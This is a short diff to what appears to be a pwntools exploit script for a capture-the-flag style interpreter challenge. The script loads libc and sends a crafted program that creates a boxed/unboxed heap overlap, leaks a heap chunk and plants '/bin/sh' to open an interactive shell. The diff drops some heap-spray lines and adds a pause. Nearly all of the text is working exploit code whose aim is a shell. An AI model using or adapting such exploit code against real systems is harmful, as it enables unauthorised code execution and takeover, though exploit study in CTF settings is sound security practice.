@@ -13,23 +13,9 @@ else:
     libc = ELF("/usr/lib/libc-2.29.so")
 pause()
 GETSHELL = '''
-INT A 1
-INT B 1
-INT C 1
-INT D 1
-INT E 1
-INT d 1
-INT f 1
-INT Q 1
-INT G 1
-INT q 1 # Heap spray a bit to cleanup
-
-INT ADDROFA 0
-
 INT a 99
 DEL a
 BOX b 1 # Create boxed/unboxed overlap
-MOV ADDROFA A
 PRINT a # Leak Heap chunk
 
 INT z 24
@@ -70,6 +56,7 @@ END
         u64("/bin/sh\x00")
         )
 print GETSHELL
+pause()
 p.sendline(GETSHELL)
 
 p.interactive()
